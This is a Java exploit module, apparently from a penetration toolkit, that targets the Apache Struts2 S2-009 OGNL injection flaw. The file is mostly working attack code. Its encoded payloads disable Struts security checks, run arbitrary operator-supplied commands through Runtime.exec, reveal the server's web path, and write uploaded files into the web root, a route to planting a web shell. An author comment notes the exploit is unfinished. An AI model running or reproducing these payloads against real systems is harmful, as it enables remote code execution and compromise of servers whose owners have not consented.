package fun.fireline.exp.apache.struts2;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.net.URLEncoder;
import java.util.HashMap;
import java.util.UUID;

/**
 * @author yhy
 * @date 2021/8/17 13:57
 * @github https://github.com/yhy0
 * 该 exp 有缺陷，没写完
 */

public class S2_009 implements ExploitInterface {

    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();

    private String payload = "class.classLoader.jarPath=%28%23context[%22xwo" +
            "rk.MethodAccessor.denyMethodExecution%22]%3d+new+java.lang.Boo" +
            "lean%28false%29%2c+%23_memberAccess[%22allowStaticMethodAccess" +
            "%22]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29." +
            // payload 为替换命令
            "exec%28%27payload%27%29.getInputStream%28%29%2c%23b%3dnew+ja" +
            "va.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.Buffere" +
            "dReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read" +
            "%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionCo" +
            "ntext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println" +
            "%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.clas" +
            "sLoader.jarPath%29%28%27meh%27%29]";

    private String webPath = "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i97)(('\\43xman.getWriter().println(\\43req.getRealPath(\"\\u005c\"))')(d))&(i99)(('\\43xman.getWriter().close()')(d))";

    @Override
    public String checkVul(String url) {
        String uuid =  UUID.randomUUID().toString();

        this.target = url;
        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        String data = this.payload.replace("payload", "echo " + uuid);
        Response response = HttpTools.post(this.target, data, this.headers, "UTF-8");

        if(response.getText() != null  && response.getText().contains(uuid)) {
            this.isVul = true;
            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
        } else if (response.getError() != null) {
            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
        } else {
            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
        }

    }

    @Override
    public String exeCmd(String cmd, String encoding) {

        String data = this.payload.replace("payload", cmd);
        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        Response response = HttpTools.post(this.target, data, headers, encoding);
        return Tools.regReplace(response.getText());
    }

    @Override
    public String getWebPath() {
        Response response = HttpTools.post(this.target, webPath, headers, "UTF-8");
        return response.getText();
    }

    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {
        String uuid =  UUID.randomUUID().toString();

        fileContent = URLEncoder.encode(fileContent, "UTF-8" );

        String payload = "('\\u0023_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003d\\u0023foo')(\\u0023foo\\u003dnew%20java.lang.Boolean(%22false%22)))=&(i1)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))=&(i12)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))=&(i13)(('\\43xman.getWriter().println(\\43req.getServletContext().getRealPath(%22\\u005c%22))')(d))=&(i2)(('\\43fos\\75new\\40java.io.FileOutputStream(new\\40java.lang.StringBuilder(\\43req.getRealPath(%22\\u005c%22)).append(%22/" + filename + "%22).toString())')(d))=&(i3)(('\\43fos.write(\\43req.getParameter(%22t%22).getBytes())')(d))=&(i4)(('\\43fos.close()')(d))(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))=&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))=&(i95)(('\\43xman.getWriter().print(\"" + uuid+ "\")')(d))=&(i99)(('\\43xman.getWriter().close()')(d))=&t=" + fileContent;

        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        Response response = HttpTools.post(this.target, payload, headers, "UTF-8");

        String result = response.getText();

        if(result.contains(uuid)) {
            result = result + "  上传成功! ";
        } else {
            result =  "上传失败";
        }

        return result;

    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
